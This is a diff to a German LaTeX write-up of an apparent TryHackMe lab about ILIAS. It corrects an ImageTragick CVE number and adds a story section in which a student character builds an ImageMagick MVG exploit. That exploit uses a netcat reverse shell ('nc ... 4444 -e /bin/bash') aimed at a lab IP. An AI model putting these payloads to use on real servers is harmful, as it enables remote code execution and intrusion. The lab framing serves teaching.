@@ -279,9 +279,9 @@
     Immer gleich Abläufe für eine Großzahl an Bildern können so vereinfacht werde, weshalb die Software auch in Ilias eingesetzt wird~\parencite{imagemagick}.
 
 
-    \subsubsection{CVE-2016-3718 (ImageTragick)}
-    \label{subsubsec:CVE-2016-3718}
-    Die Schwachstelle \href{https://www.cve.org/CVERecord?id=CVE-2016-3718}{CVE-2016-3718}, auch \glqq ImageTragick\grqq\ genannt, tritt in den Versionen 6.9.3-10 und 7.x vor 7.0.1-1 von ImageMagick auf.
+    \subsubsection{CVE-2016-3714 (ImageTragick)}
+    \label{subsubsec:CVE-2016-3714}
+    Die Schwachstelle \href{https://www.cvedetails.com/cve/CVE-2016-3714/}{CVE-2016-3714}, auch \glqq ImageTragick\grqq\ genannt, tritt in den Versionen 6.9.3-10 und 7.x vor 7.0.1-1 von ImageMagick auf.
     Die Sicherheitslücke ist im Jahre 2016 erstmal entdeckt worden und betrifft die Verarbeitung von Bilddateien mit der ImageMagick Software-Bibliothek.
     Durch \glqq ImageTragick\grqq\ ist es möglich, Schadcode in Form einer Bilddatei in ein System einzuschleusen und anschließend serverseitig auszuführen.
     Da es sich bei ImageMagick um eine Software-Bibliothek handelt, die wie in~\ref{subsec:ImageMagick} bereits erwähnt eine große Nutzerzahl aufweist, war die Schwachstelle zum Zeitpunkt ihrer Entdeckung durch die Sicherheitsfirma Check Point in einer Vielzahl von Softwareprodukten zu finden~\parencite{imageTragicReport}.
@@ -391,11 +391,11 @@
     Er konnte sogar schon erste Erfahrung als Berater für ein paar renommierte Firmen aus der Umgebung machen.
     Und eines sollte gesagt sein, in Heilbronn sind ein paar der renommiertesten Firmen Deutschlands ansässig.
     Genau deshalb hat TimDerHackerboy sein Studium die letzten Wochen aber auch schleifen lassen, die Praxis und das Geld waren einfach zu verlockend.
-    All das weiß Professor SuperSecureAndi nicht, sein Student Tim ist schließlich nie zu den Vorlesungen erschienen und auch sonst glänzte er nicht gerade mit außerordentlichem Fleiß.
+    All das weiß Professor SuperSicherAndi nicht, sein Student Tim ist schließlich nie zu den Vorlesungen erschienen und auch sonst glänzte er nicht gerade mit außerordentlichem Fleiß.
     Hier steht TimDerHackerboy also, die letzte Woche der Vorlesungszeit ist angebrochen und er hat noch nichts gemacht.
-    Professor SuperSecureAndi hat die Studenten dazu verdonnert, ganze 35 TryHackMe Räume zu machen.
+    Professor SuperSicherAndi hat die Studenten dazu verdonnert, ganze 35 TryHackMe Räume zu machen.
     Und als wäre das nicht genug, soll TimDerHackerboy auch noch einen eigenen TryHackMe Raum einwickeln und eine Ausarbeitung darüber schreiben.
-    Ein Berg an Arbeit, der kaum zu bewältigen ist, Professor SuperSecureAndi wird ihn höchstwahrscheinlich durchfallen lassen.
+    Ein Berg an Arbeit, der kaum zu bewältigen ist, Professor SuperSicherAndi wird ihn höchstwahrscheinlich durchfallen lassen.
     Doch Tim würde nicht den Spitznamen Hackerboy tragen, wenn er nicht eine bessere Idee hätte.
     Warum nicht einfach ILIAS hacken und sicher selber eine eins geben.
     Aus Gesprächen weiß er, viele Professoren verwaltete ihre Noten direkt in ILIAS, es sei schließlich sicher.
@@ -407,6 +407,59 @@
 
     \subsection{Virtuelle Maschine 2}
     \label{subsec:vm2}
+    TimDerHackerboy in sicher erfolgreich durch die \ac{vm}1 gekämpft und seine Note geändert.
+    Seine Spuren hat er erfolgreich verwischt und sogar Credentials für eine neue ILIAS Version gefunden, die durch Administratoren der Hochschule gerade aufgesetzt wird.
+    Die Verantwortlichen der Hochschule, zu denen auch der Professor SuperSicherAndi zählt, entschieden sich so die bekannte XSS Schachstelle aus Version 5.2.3 zu beheben.
+    Tim wäre kein Hackerboy würde er sich nicht direkt an die Arbeit machen und den Administratoren zeigen, dass sie ihre Arbeit nicht richtig machen.
+    So könnte er Professor SuperSicherAndi beweisen, dass er die eins auf jeden Fall verdient hat, sollte dieser ihm trotz aller Vorsichtsmaßnahmen auf die Schliche kommen.
+
+    \subsubsection{ImageMagick Schwachstelle finden und Payload erstellen}
+    \label{subsubsec:imageMagickFinden}
+    
+    Komplett vertieft will Tim sich direkt mit den Credentials einloggen.
+    Als er die Login-Seite kurz überfliegt, fallen ihm die Wort \textit{using ImageMagic(v6.9.3-8)} direkt auf.
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/loginPageHinweisImageMagick}
+        \caption{Login Page ILIAS}
+        \label{fig:loginPage}
+    \end{figure}
+
+    \noindent
+    Er hatte vor kurzem etwas über ImageTragic gelesen.
+    Und wie so oft, bietet \href{https://www.exploit-db.com/exploits/39767}{\textbf{exlpoit-db}} direkt die richtigen Informationen.
+
+    \vspace{0.5}
+    \begin{lstlisting}[label={lst:imageMagickExploit}]
+        exploit.mvg
+        -=-=-=-=-=-=-=-=-
+        push graphic-context
+        viewbox 0 0 640 480
+        fill 'url(https://example.com/image.jpg"|ls "-la)'
+        pop graphic-context
+    \end{lstlisting}~\parencite{imagemagickExploit}
+    \vspace{0.5cm}
+    \\
+    Dieser Exlpoit zeigt nach dem Ausführen eine Liste aller Dateien und Verzeichnisse im aktuellen Verzeichnis als Profilbild an.
+    Das ist Tim jedoch nicht genug, er möchte eine Reverse Shell.
+    Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc 192.168.100.113 4444 –e /bin/bash}.
+    Der in~\ref{lst:imageMagickExploit} beschriebene Exploit kann um die Netcat Reverse Shell ergänzt werden um den fertigen Exploit zu erhalten.
+
+    \begin{lstlisting}[label={lst:imageMagickExploitFinal}]
+        #In von ImageMagick akzeptiertem Dateiformat speichern
+        push graphic-context
+        viewbox 0 0 640 480
+        fill 'url(https://example.com/image.jpg"|nc 10.39.0.127 4444 "-e/bin/bash '
+        pop graphic-context
+    \end{lstlisting}
+
+    \subsubsection{Verbindung mittels Reverse Shell herstellen}
+    \label{subsubsec:verbindunHerstellen}
+
+
+
+
+
 
 
 
